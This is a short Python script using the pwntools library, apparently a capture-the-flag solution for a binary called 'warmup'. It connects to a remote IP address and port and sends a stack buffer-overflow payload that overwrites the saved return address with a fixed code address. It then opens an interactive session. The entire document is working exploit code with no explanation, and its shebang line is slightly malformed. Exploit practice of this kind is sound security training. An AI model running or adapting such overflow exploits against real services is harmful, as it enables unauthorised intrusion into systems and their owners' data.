#!usr/bin/python

from pwn import *

io = remote("220.249.52.133", 54704)
# io = process("./warmup")

payload = "a" * 0x40 + "a" * 8 + p64(0x40060D)

io.sendline(payload)

io.interactive()
